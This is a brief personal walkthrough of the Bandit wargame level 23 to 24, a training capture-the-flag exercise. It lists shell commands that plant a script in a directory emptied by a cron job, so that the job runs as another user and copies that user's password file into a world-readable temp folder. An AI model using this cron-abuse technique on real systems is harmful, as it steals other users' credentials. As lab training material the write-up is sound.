# Bandit 23 -> 24
 - A program is running automatically at regular intervals from cron, the time-based job scheduler. 
 -Look in /etc/cron.d/ for the configuration and see what command is being executed.

## Commands
``` bash
  ls -la /etc/cron.d/
  cat /etc/cron.d/cronjob_bandit23
  cat  /usr/bin/cronjob_bandit24.sh
  mkdir /tmp/mine/
  chmod 777 /tmp/mine/
  cd /tmp/mine/
  echo '#!/bin/bash' > get_pass.sh
  echo 'cat /etc/bandit_pass/bandit24 > /tmp/mine/password.txt' >> get_pass.sh
  chmod 777 get_pass.sh
  cp get_pass.sh /var/spool/bandit24/foo/
  ls -la /var/spool/bandit24/foo/
  cat /tmp/mine/password.txt
```

## Observation and Mistakes
 - Ts was tuff cuz mainly it needed to use the script and then copy the password to elsewhere
 